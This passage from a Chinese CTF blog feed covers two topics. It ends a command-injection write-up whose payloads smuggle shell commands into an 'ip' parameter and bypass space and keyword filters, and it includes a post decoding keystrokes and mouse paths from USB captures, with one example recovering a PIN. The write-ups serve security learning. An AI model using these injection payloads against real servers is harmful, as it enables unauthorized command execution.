$m;    }}?&gt;</code></pre><p>题目给出源码，发现过滤了运算符(<code>|</code>、<code>&amp;</code>)、<code>;</code>、空格、目录分隔符、<code>cat</code>、flag关键字和ctfhub关键字<br>于是构造以下payload进行绕过：</p><pre><code class="bash">%0a绕过运算符和;$IFS$9代替空格${PATH:0:1}代替/more代替cat通配符代替flag?ip=%0als #得到flag文件目录flag_is_here?ip=%0als$IFS$9*_is_here${PATH:0:1} #得到flag文件flag_1832680587320.php?ip=%0amore$IFS$9*_is_here${PATH:0:1}*_1832680587320.php #查看源代码得到flag</code></pre><h2 id="0x07-GXYCTF2019-Ping-Ping-Ping"><a href="#0x07-GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="0x07 GXYCTF2019-Ping Ping Ping"></a>0x07 GXYCTF2019-Ping Ping Ping</h2><p><strong>考点：绕过空格+绕过黑名单(也可内敛执行绕过)</strong></p><pre><code class="shell">?ip=|ls</code></pre><p>得到<code>flag.php</code>和<code>index.php</code>。然后查看flag.php内容：</p><pre><code class="shell">?ip=|cat flag.php</code></pre><p>发现响应：<code>/?ip= fxck your space!</code>，于是绕过空格</p><pre><code class="shell">?ip=|cat${IFS}flag.php #发现响应：/?ip= 1fxck your symbol!，很明显不行?ip=|cat$IFS$9flag.php</code></pre><p>发现响应：<code>/?ip= fxck your flag!</code>，应该是过滤了<code>flag</code>关键字，于是可以绕过黑名单或使用内敛执行绕过<br>（1）方法一：绕过黑名单<br>经测试可以使用拼接绕过</p><pre><code class="shell">?ip=;a=g;cat$IFS$9fla$a.php</code></pre><p>然后查看源码，得到flag<br><img src="http://img-blog.csdnimg.cn/20200810144201858.png" alt="在这里插入图片描述"><br>（2）方法二：内敛执行绕过</p><pre><code class="shell">?ip=|cat$IFS$9`ls`</code></pre><p><img src="http://img-blog.csdnimg.cn/20200810144400181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="0x08-后记"><a href="#0x08-后记" class="headerlink" title="0x08 后记"></a>0x08 后记</h2><p>学过命令执行的相关绕过后，再做这些题，发现竟如此容易。由此看来，技术知识和CTF题目是相辅相成的。继续努力吧！</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> 命令执行绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF流量分析常见题型(二)-USB流量</title>
      <link href="/2020/08/01/CTF%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%B8%B8%E8%A7%81%E9%A2%98%E5%9E%8B(%E4%BA%8C)-USB%E6%B5%81%E9%87%8F/"/>
      <url>/2020/08/01/CTF%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%B8%B8%E8%A7%81%E9%A2%98%E5%9E%8B(%E4%BA%8C)-USB%E6%B5%81%E9%87%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在学习Wireshark常见使用时，对常见CTF流量分析题型和铁人三项流量分析题的部分问题进行了简单总结。由于篇幅过长，于是另起一篇总结USB流量包分析，包括<code>键盘流量</code>和<code>鼠标流量</code>。</p><h2 id="0x01-USB流量包分析"><a href="#0x01-USB流量包分析" class="headerlink" title="0x01 USB流量包分析"></a>0x01 USB流量包分析</h2><p>USB流量指的是USB设备接口的流量，攻击者能够通过监听usb接口流量获取键盘敲击键、鼠标移动与点击、存储设备的铭文传输通信、USB无线网卡网络传输内容等等。在CTF中，USB流量分析主要以键盘和鼠标流量为主。</p><h3 id="1、键盘流量"><a href="#1、键盘流量" class="headerlink" title="1、键盘流量"></a>1、键盘流量</h3><p>USB协议数据部分在Leftover Capture Data域中，数据长度为<code>八个字节</code>。其中键盘击键信息集中在第三个字节中。<br><img src="http://img-blog.csdnimg.cn/20200801001134609.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>如图，发现击键信息为0x06，即对应的按键为<code>C</code><br>键位映射关系参考：<a href="https://wenku.baidu.com/view/9050c3c3af45b307e971971e.html" target="_blank" rel="noopener">《USB键盘协议中键码》中的HID Usage ID</a></p><h4 id="1-题型："><a href="#1-题型：" class="headerlink" title="1.题型："></a>1.题型：</h4><p>flag隐藏在usb流量中，通过USB协议数据中的键盘键码转换成键位。</p><h4 id="2-解题思路："><a href="#2-解题思路：" class="headerlink" title="2.解题思路："></a>2.解题思路：</h4><p>1.使用kali linux中的tshark 命令把cap data提取出来：</p><pre><code class="shell">tshark -r usb.pcap -T fields -e usb.capdata &gt; usbdata.txttshark -r usb.pcap -T fields -e usb.capdata | sed &#39;/^\s*$/d&#39; &gt; usbdata.txt #提取并去除空行</code></pre><p>2.根据《USB键盘协议中键码》中的HID Usage ID将数据还原成键位，可写一个Python脚本进行快速转换。</p><h4 id="3-题目示例："><a href="#3-题目示例：" class="headerlink" title="3.题目示例："></a>3.题目示例：</h4><p><a href="https://pan.baidu.com/s/1bGEIPeXDCbhybmWOyGr8Og" target="_blank" rel="noopener">【NSCTF】安全评测人员在对某银行卡密码输入系统进行渗透测试，截获了一段通过USB键盘输入6位数字密码的流量，其中也包含了一些其他无关的USB设备的流量，你能从中恢复出6位数字密码吗？最终提交的flag格式为flag</a><br>提取码：q6ro<br>（1）使用tshark 命令把pcap的数据提取并去除空行到<code>usbdata.txt</code></p><pre><code class="shell">tshark -r usb.pcap -T fields -e usb.capdata | sed &#39;/^\s*$/d&#39; &gt; usbdata.txt</code></pre><p><img src="http://img-blog.csdnimg.cn/20200801012922198.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>（2）提取出来的数据可能会带冒号，也可能不带（有可能和wireshark的版本相关），但是一般的脚本都会按照有冒号的数据来识别</p><blockquote><p>有冒号时提取数据的<code>[6:8]</code><br>无冒号时数据在<code>[4:6]</code></p></blockquote><p>可以用脚本来加上冒号</p><pre><code class="py">f=open(&#39;usbdata.txt&#39;,&#39;r&#39;)fi=open(&#39;out.txt&#39;,&#39;w&#39;)while 1:    a=f.readline().strip()    if a:        if len(a)==16: # 鼠标流量的话len改为8            out=&#39;&#39;            for i in range(0,len(a),2):                if i+2 != len(a):                    out+=a[i]+a[i+1]+&quot;:&quot;                else:                    out+=a[i]+a[i+1]            fi.write(out)            fi.write(&#39;\n&#39;)    else:        breakfi.close()</code></pre><p>此时对应的第三字节，也就是[6:8]就代表了击键信息<br>（3）提取出键盘流量后需要用脚本还原数据对应的信息。同时找到两个还原信息的脚本（python2）：<br><code>keyboard1.py</code></p><pre><code class="py">mappings = { 0x04:&quot;A&quot;,  0x05:&quot;B&quot;,  0x06:&quot;C&quot;, 0x07:&quot;D&quot;, 0x08:&quot;E&quot;, 0x09:&quot;F&quot;, 0x0A:&quot;G&quot;,  0x0B:&quot;H&quot;, 0x0C:&quot;I&quot;,  0x0D:&quot;J&quot;, 0x0E:&quot;K&quot;, 0x0F:&quot;L&quot;, 0x10:&quot;M&quot;, 0x11:&quot;N&quot;,0x12:&quot;O&quot;,  0x13:&quot;P&quot;, 0x14:&quot;Q&quot;, 0x15:&quot;R&quot;, 0x16:&quot;S&quot;, 0x17:&quot;T&quot;, 0x18:&quot;U&quot;,0x19:&quot;V&quot;, 0x1A:&quot;W&quot;, 0x1B:&quot;X&quot;, 0x1C:&quot;Y&quot;, 0x1D:&quot;Z&quot;, 0x1E:&quot;1&quot;, 0x1F:&quot;2&quot;, 0x20:&quot;3&quot;, 0x21:&quot;4&quot;, 0x22:&quot;5&quot;,  0x23:&quot;6&quot;, 0x24:&quot;7&quot;, 0x25:&quot;8&quot;, 0x26:&quot;9&quot;, 0x27:&quot;0&quot;, 0x28:&quot;\n&quot;, 0x2a:&quot;[DEL]&quot;,  0X2B:&quot;    &quot;, 0x2C:&quot; &quot;,  0x2D:&quot;-&quot;, 0x2E:&quot;=&quot;, 0x2F:&quot;[&quot;,  0x30:&quot;]&quot;,  0x31:&quot;\\&quot;, 0x32:&quot;~&quot;, 0x33:&quot;;&quot;,  0x34:&quot;&#39;&quot;, 0x36:&quot;,&quot;,  0x37:&quot;.&quot; }nums = []keys = open(&#39;out.txt&#39;)for line in keys:    if line[0]!=&#39;0&#39; or line[1]!=&#39;0&#39; or line[3]!=&#39;0&#39; or line[4]!=&#39;0&#39; or line[9]!=&#39;0&#39; or line[10]!=&#39;0&#39; or line[12]!=&#39;0&#39; or line[13]!=&#39;0&#39; or line[15]!=&#39;0&#39; or line[16]!=&#39;0&#39; or line[18]!=&#39;0&#39; or line[19]!=&#39;0&#39; or line[21]!=&#39;0&#39; or line[22]!=&#39;0&#39;:         continue    nums.append(int(line[6:8],16))keys.close()output = &quot;&quot;for n in nums:    if n == 0 :        continue    if n in mappings:        output += mappings[n]    else:        output += &#39;[unknown]&#39;print &#39;output :\n&#39; + output</code></pre><p><code>keyboard2.py</code></p><pre><code class="py">normalKeys = {    &quot;04&quot;:&quot;a&quot;, &quot;05&quot;:&quot;b&quot;, &quot;06&quot;:&quot;c&quot;, &quot;07&quot;:&quot;d&quot;, &quot;08&quot;:&quot;e&quot;,    &quot;09&quot;:&quot;f&quot;, &quot;0a&quot;:&quot;g&quot;, &quot;0b&quot;:&quot;h&quot;, &quot;0c&quot;:&quot;i&quot;, &quot;0d&quot;:&quot;j&quot;,     &quot;0e&quot;:&quot;k&quot;, &quot;0f&quot;:&quot;l&quot;, &quot;10&quot;:&quot;m&quot;, &quot;11&quot;:&quot;n&quot;, &quot;12&quot;:&quot;o&quot;,      &quot;13&quot;:&quot;p&quot;, &quot;14&quot;:&quot;q&quot;, &quot;15&quot;:&quot;r&quot;, &quot;16&quot;:&quot;s&quot;, &quot;17&quot;:&quot;t&quot;,       &quot;18&quot;:&quot;u&quot;, &quot;19&quot;:&quot;v&quot;, &quot;1a&quot;:&quot;w&quot;, &quot;1b&quot;:&quot;x&quot;, &quot;1c&quot;:&quot;y&quot;,        &quot;1d&quot;:&quot;z&quot;,&quot;1e&quot;:&quot;1&quot;, &quot;1f&quot;:&quot;2&quot;, &quot;20&quot;:&quot;3&quot;, &quot;21&quot;:&quot;4&quot;,         &quot;22&quot;:&quot;5&quot;, &quot;23&quot;:&quot;6&quot;,&quot;24&quot;:&quot;7&quot;,&quot;25&quot;:&quot;8&quot;,&quot;26&quot;:&quot;9&quot;,         &quot;27&quot;:&quot;0&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\t&quot;,         &quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;-&quot;,&quot;2e&quot;:&quot;=&quot;,&quot;2f&quot;:&quot;[&quot;,&quot;30&quot;:&quot;]&quot;,&quot;31&quot;:&quot;\\&quot;,         &quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;;&quot;,&quot;34&quot;:&quot;&#39;&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;,&quot;,&quot;37&quot;:&quot;.&quot;,         &quot;38&quot;:&quot;/&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,         &quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,         &quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;}shiftKeys = {    &quot;04&quot;:&quot;A&quot;, &quot;05&quot;:&quot;B&quot;, &quot;06&quot;:&quot;C&quot;, &quot;07&quot;:&quot;D&quot;, &quot;08&quot;:&quot;E&quot;,     &quot;09&quot;:&quot;F&quot;, &quot;0a&quot;:&quot;G&quot;, &quot;0b&quot;:&quot;H&quot;, &quot;0c&quot;:&quot;I&quot;, &quot;0d&quot;:&quot;J&quot;,      &quot;0e&quot;:&quot;K&quot;, &quot;0f&quot;:&quot;L&quot;, &quot;10&quot;:&quot;M&quot;, &quot;11&quot;:&quot;N&quot;, &quot;12&quot;:&quot;O&quot;,       &quot;13&quot;:&quot;P&quot;, &quot;14&quot;:&quot;Q&quot;, &quot;15&quot;:&quot;R&quot;, &quot;16&quot;:&quot;S&quot;, &quot;17&quot;:&quot;T&quot;,        &quot;18&quot;:&quot;U&quot;, &quot;19&quot;:&quot;V&quot;, &quot;1a&quot;:&quot;W&quot;, &quot;1b&quot;:&quot;X&quot;, &quot;1c&quot;:&quot;Y&quot;,         &quot;1d&quot;:&quot;Z&quot;,&quot;1e&quot;:&quot;!&quot;, &quot;1f&quot;:&quot;@&quot;, &quot;20&quot;:&quot;#&quot;, &quot;21&quot;:&quot;$&quot;,          &quot;22&quot;:&quot;%&quot;, &quot;23&quot;:&quot;^&quot;,&quot;24&quot;:&quot;&amp;&quot;,&quot;25&quot;:&quot;*&quot;,&quot;26&quot;:&quot;(&quot;,&quot;27&quot;:&quot;)&quot;,          &quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,          &quot;2d&quot;:&quot;_&quot;,&quot;2e&quot;:&quot;+&quot;,&quot;2f&quot;:&quot;{&quot;,&quot;30&quot;:&quot;}&quot;,&quot;31&quot;:&quot;|&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;\&quot;&quot;,          &quot;34&quot;:&quot;:&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;&lt;&quot;,&quot;37&quot;:&quot;&gt;&quot;,&quot;38&quot;:&quot;?&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,          &quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,          &quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;}output = []keys = open(&#39;out.txt&#39;)for line in keys:    try:        if line[0]!=&#39;0&#39; or (line[1]!=&#39;0&#39; and line[1]!=&#39;2&#39;) or line[3]!=&#39;0&#39; or line[4]!=&#39;0&#39; or line[9]!=&#39;0&#39; or line[10]!=&#39;0&#39; or line[12]!=&#39;0&#39; or line[13]!=&#39;0&#39; or line[15]!=&#39;0&#39; or line[16]!=&#39;0&#39; or line[18]!=&#39;0&#39; or line[19]!=&#39;0&#39; or line[21]!=&#39;0&#39; or line[22]!=&#39;0&#39; or line[6:8]==&quot;00&quot;:             continue        if line[6:8] in normalKeys.keys():            output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]==&#39;2&#39;]        else:            output += [&#39;[unknown]&#39;]    except:        passkeys.close()flag=0print(&quot;&quot;.join(output))for i in range(len(output)):    try:        a=output.index(&#39;&lt;DEL&gt;&#39;)        del output[a]        del output[a-1]    except:        passfor i in range(len(output)):    try:        if output[i]==&quot;&lt;CAP&gt;&quot;:            flag+=1            output.pop(i)            if flag==2:                flag=0        if flag!=0:            output[i]=output[i].upper()    except:        passprint (&#39;output :&#39; + &quot;&quot;.join(output))</code></pre><p>运行第一个脚本得到<br><img src="http://img-blog.csdnimg.cn/20200801014600832.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre><code class="shell">BCFGIJGFEDCABACFEDCA7200[DEL]53[DEL]93因为[DEL]是删除键,恢复出6位数字。所以flag: 720593</code></pre><h3 id="2、鼠标流量"><a href="#2、鼠标流量" class="headerlink" title="2、鼠标流量"></a>2、鼠标流量</h3><p>USB协议鼠标数据部分在Leftover Capture Data域中，数据长度为<code>四个字节</code>。</p><blockquote><p>其中第一个字节代表按键，当取0x00时，代表没有按键、为0x01时，代表按左键，为0x02时，代表当前按键为右键。<br>第二个字节可以看成是一个signed byte类型，其最高位为符号位，当这个值为正时，代表鼠标水平右移多少像素，为负时，代表水平左移多少像素。<br>第三个字节与第二字节类似，代表垂直上下移动的偏移。</p></blockquote><p><img src="http://img-blog.csdnimg.cn/20200801015359139.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>如图，数据信息为0x00002000，表示鼠标垂直向上移动20。</p><h4 id="1-题型：-1"><a href="#1-题型：-1" class="headerlink" title="1.题型："></a>1.题型：</h4><p>flag隐藏在usb流量中，通过USB协议数据中的鼠标移动轨迹转换成flag。</p><h4 id="2-解题思路：-1"><a href="#2-解题思路：-1" class="headerlink" title="2.解题思路："></a>2.解题思路：</h4><p>1.使用kali linux中的tshark 命令把cap data提取出来，并去除空行</p><pre><code class="shell">tshark -r usb2.pcap -T fields -e usb.capdata &gt; usbdata.txttshark -r usb2.pcap -T fields -e usb.capdata | sed &#39;/^\s*$/d&#39; &gt; usbdata.txt #提取并去除空行</code></pre><p>2.根据usb协议鼠标数据还原鼠标移动轨迹，可写一个Python脚本进行快速还原。</p><h4 id="3-题目示例：-1"><a href="#3-题目示例：-1" class="headerlink" title="3.题目示例："></a>3.题目示例：</h4><p><a href="https://pan.baidu.com/s/1bGEIPeXDCbhybmWOyGr8Og" target="_blank" rel="noopener">【NSCTF】这是一道鼠标流量分析题。</a><br>提取码：q6ro<br>（1）使用tshark 命令把pcap的数据提取并去除空行到<code>usbdata.txt</code></p><pre><code class="shell">tshark -r usb2.pcap -T fields -e usb.capdata | sed &#39;/^\s*$/d&#39; &gt; usbdata.txt</code></pre><p>（2）使用上面提到过的加冒号的脚本，并将脚本里提到的<code>16</code>改为<code>8</code>，得到</p><pre><code class="py">python3 maohao.py</code></pre><p><img src="http://img-blog.csdnimg.cn/20200801020533385.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>（3）使用mouse.py测试信息隐藏位置</p><pre><code class="py">nums = []keys = open(&#39;out.txt&#39;,&#39;r&#39;)f = open(&#39;xy.txt&#39;,&#39;w&#39;)posx = 0posy = 0for line in keys:    if len(line) != 12 :        continue    x = int(line[3:5],16)    y = int(line[6:8],16)    if x &gt; 127 :        x -= 256    if y &gt; 127 :        y -= 256    posx += x    posy += y    btn_flag = int(line[0:2],16)  # 1 for left , 2 for right , 0 for nothing    if btn_flag == 2 : # 1 代表左键        f.write(str(posx))        f.write(&#39; &#39;)        f.write(str(posy))        f.write(&#39;\n&#39;)f.close()</code></pre><p>测试发现flag信息藏在右键中，即当脚本中btn_flag取2时可以得到一系列坐标<br><img src="http://img-blog.csdnimg.cn/20200801021555704.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>（4）用gnuplot将<code>xy.txt</code>里的坐标转化成图像</p><pre><code class="shell">gnuplotgnuplot&gt;plot &quot;xy.txt&quot;</code></pre><p><img src="http://img-blog.csdnimg.cn/20200801022658438.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现方向反了，使用windows上的”画图”垂直翻转一下即可。<br><img src="http://img-blog.csdnimg.cn/20200801023957892.png" alt="在这里插入图片描述"><br>最终得到flag<br><img src="http://img-blog.csdnimg.cn/20200801024028239.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="0x02-后记"><a href="#0x02-后记" class="headerlink" title="0x02 后记"></a>0x02 后记</h2><p>本次总结了USB流量包的流量分析，对键盘流量和鼠标流量有了简单的了解。</p><p>参考博客：<br><a href="http://www.ga1axy.top/index.php/archives/22/" target="_blank" rel="noopener">USB流量知识点小结</a><br><a href="https://www.freebuf.com/sectool/201830.html" target="_blank" rel="noopener">CTF流量分析之题型深度解析</a></p>]]></content>
      
      
      <categories>
          
          <category> 流量分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 流量分析 </tag>
            
            <tag> 键盘流量 </tag>
            
            <tag> 鼠标流量 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wireshark常见使用与CTF流量分析常见题型</title>
      <link href="/2020/07/29/Wireshark%E5%B8%B8%E8%A7%81%E4%BD%BF%E7%94%A8%E4%B8%8ECTF%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%B8%B8%E8%A7%81%E9%A2%98%E5%9E%8B/"/>
      <url>/2020/07/29/Wireshark%E5%B8%B8%E8%A7%81%E4%BD%BF%E7%94%A8%E4%B8%8ECTF%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%B8%B8%E8%A7%81%E9%A2%98%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，才能查看文章哦！</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="d1a84d67652dfc113262cad80b9e17b1c56ff45663ca8918822e144f7562ffec">1c9d7b1072f2bc7d00215ad5dda31443e2c9d76587874b9892ed1ea893a96dbfde39ad637be7a1e79c5162222d2f194f6e261781f78b4d4fe9680c061193249a686dee4fa8463b2a2c70813f0d3196ad8b25fe72f6661e8a744ec5e22eaec74760ff845ad53f9e4c99fd34fca88ef622828398586332ef199506f7e4e18c44f0e5cbf12fd80979389331674d3871d552754138aa1d883ce6c665f18ae0453108069f66601a9779e3f4ed7b46ae1e7fb0cf0007651ee77f0fe99fd5d7318f089aca10cca8caaf0e67287e1971e7dfb7ea01d1b30fc8129ba5d8005f08d76dadb401ce2dc4bb18073928afae69074791eb31be9f3af981ef49d07d731db48843c1b08b57eede936ce902fa90e4cdcf6f562d67d294fffa13b1c4523b80a6db4e918dcf1c9b2c0b0d03b8ebe7cb0a6a01f0639c4cc641aff250baa8ee61ce47013251c67cad3ab1b8ea5f973b8d04e6efd3f2fd1ea19ca29b3a48e2a8e46e377f0396ccf242b019a50ae020fb6440ca27c963e35115e183f6ddd13bcad9bf19e6a064931c0792820d6233c4a4ec52f443dbcfe18562ac0c8f9da27c5a2f04fb9a3b71c216a19c49e4d4156efdccdedffcbaada57af7daa6b3e69e29b9262a087f5eb87d74dc220d46ef3d3334ae24823f56e9cdb3442ccb835703f9aa36bf665942121f3710fda411afb895938ffd3f71e9a200a73e4a6cac147dcd448eeff6c33c00cc6e2b31ab740d7b9ed75c55aa5cb8b7df4931e4bea546b2e350552e44df9922545e43068d07fb07bcdc841b1c5b47966a6948807d0f45aeac0a131c147b9f0eb4cd22c18acbcff650654462dda33fc39b8477d86281423010cc0efb9480ef4b362c83c4b428d89eba2ed6fcfb74797145e1400c02aea26d650c3a6b38723d4abf6634fb79b2e4efb11ad2a5dacf3b08df252d1fe49c9c2f359ef13ea0828eadf6e7fef50a202c36f2b3063d27b0b10de9abdc2b47373812cc185156652ee2a705853196b7c67d54cbc7d80609597bb950b38dfeab7039ae34dc768ce8396de666c5b524558a6443f9491510d6659dd13547d1d6230b96317a09a875e9edc36a2dc5aa0c4bad93a9b4d972defcd9dd5a0d772ad3588c45ea76739a57b1802a48fe91ce0bd2b1e61e86489a86a81e1f90adb7c8d573cbf665db01051f1fa65bf9195630cd1998647f9d561fd9139f9e5a1fd8794f182fb1b4871d55243536b6821b111d1f90b8d5591ff022da46173ce1e8e14bc65545751ae90d42beaddab8452d1c8d03e93f1140c3c01ce3045e87fb680240457213ab9d057fd6fe4e92aa16bc88fcd581487a6cd62430793c5471fd46ce9bbd8373021eeea209bfa609c86a1c5012b1e71b87761cb839513170f9f4d64ae89314ebe3b715e72146c115a5d0570219699c20bfecb0ac0d6bef8dc3a66bb2016f5cf3cfec61acb78c8c3b12b31b8783d71bcb67373fe5b9c7b6a7bd877eed6043d6a651521afaae43aa306f6a682268c0b58ab2d6d498c17c89085ed4539eaa8b73715647ed481366cf987cf5fdb548174b26d121ac89b60a03abba8af0b5e15f7506f036c7881554a4cf1ac5a4ba4b7faf3d314d0a50b321f23ae42b22474166d9989266adb95b858dfe59d456db19855ed70b34a26e8c1b67478dd09c4e16ed3fe06d2f7e6f83ec2976f9d6734292def4ad215e194960379921ad6342726511467d5864dfa93342820c226380ed041944211e8c3679c44757dc8ce51e844c02a515ba4b4f6c7fea60c541ae899dc9af000fbbaa11096d0a991c515d66e1700305c48352d4e32a13f57f3d8d0d1adc4df2b14b631f5cd80df373e5d5b3c8f955001a10f65ffdca4a87ca5780f636b7810d882ef02c2750c86f60a7fb30ca0775deb15d921203758c1264c0aced0a15d36afd599a810bb5dd8b5b01d020954679f5bf4d3f0e4444bad5a1fc0622b58096567042dd4dc41e045d097b1895f6847ed63d3462e02144665968bf44d7e4145ed1ca2388fcb580746b4d0f2e0edf6059a65537ea59743323adf5fa9bb23244995b4423db74f59affd9bfba675044583e81910a11cc03c4e2ca1ce9f27dd81b31b7527c080ea9f88e30fd1f7c9f046c019b7559262e8892ee1bb41a61ca950318e33aa943a351dcd595d6461b9a5a102f3485b615b3ef358699ade74cf73e4064d996c31c5f9876d0b511d52ab9ba2b6a09adf1db7c45a0c527dc1882f78184e015b3a0b8e5e45a951d1cd8a2dce5a5cdec9bb2565f1a289aba4870ff4fc677fd59478f718989757b7eb837a2235342d1bfd3779f8484e60127075c61d52771c12f3f3a3365d4e7971567e9e1562f0dd74c71f1838d4bb9e2c1d25a468308bf8240ef8611d2c77436381aa0b2ec063f24d5abb6eda0859f1526447c33d1f3daf7145cfeb26dcde5cbe9b7681f0c6faf2bc4b13a7c61f58cae30828cbe4afa303325b9a88ee8d836bc4e03fc0a90d57468f35c716a3b92ac34ebf66785eadb9cfeb80a7c5a7c9504654c95fdc1ada91537046163ab20f7c37fb0559fbfab50e78fb6a122b18ab8f717d1a4365b0331379e284330beedde9830c3f0ba5593f88ba553166da0c454bd59e4cc0407001c3463bced99dbd9b6441fceea915f8bfc12b8908bb6f1eab3b7c410b2434c90381081f1fa824bd1ec995ba6d3a415e306e268cdec6ed003179f5e38e9022b966a6a667c8e6b852e6a209b5551cf2e7c91560f6f5d23b178a7d3641234dd2b2badaa728a88a05e3dbfb8dd7e7568d8648a8312849ec5f8a5d3491fcf6faea53842daf018629453974bb166494a2e75830b77fb0ed72ab0197d7f92f1e2b3057765d269fd66b711c477f2386da7dc6c9ef957df46289ee282c6d3e782026aa85b8497641f1267fa13f0204006ea01b90d5cf0f7197d88878a7095f8cc92981860da3fe5d4f770ae2602a50300d2fad1dfaa006bb248eb779308384b1392d97d19138f8595b1a43f40bc1a24270855db1749696b112fb9cdcda55efc25c473849298fe4acfbbf989557ddd1b163dd038dc66aa321235ecd313302be61a8f6d7295e8abf46fe6e85c4af04c083f101c7d8dbcb0a97cd6b5329b5474e1224a9fd9024e72c2754201b6192071261702097b6589aef20acb06309ae855892950a31d8d18fc8d57775e61b41609da2a0e32930fe9ef73d8d5127cd0af705590bc12c668284a98be8bf69b0bcb9efd743df5bc4c3aeece01c06fa125c84c531a8f29c43302e81933745a51322065416ec0f0a5ebcf102de4b469015c1decabe76eb21966e872b86d5c44c5ed727c53a88c3e7589beb78f88f9d964bbd342f58ef0db75b109b51fe9e6511ec69bdba05cabd385e5762316488f3519eac1f7e1f564271a124dd307a462fcf4871875bb0ec190a06cbc4fb6dbc86fa62f867286c266d1e6ddb5309f5a475d727e235124739e46d21fdd38b664738f9257625f4b5627a5b705faaabe16e82dc539641c1ebfc89bf5bbe3f0f9e86438111a36c11a99e428dc2257c3036b0f59c2c6c3edee850a57c44807dd2aacf793c1e4025058bf90281315788f5e135a6df4ac0edeb2392b70a45d7d49923b1a1590992544bed3fd967a80fca6917752737501a1a554e1f86b8133109ce0dfe868e25467b2204db6fa821536691a95cfaf2832345501bd48c151d3b2293cbf2ba90fcebb110dcd3960df2084385a1c2835038cb4ea25e6ca2fe3493e67542fbfe15be99e65efdec3845fec6c23dd4a38628f5249ac4dce41143cdc4b0752af6e93cc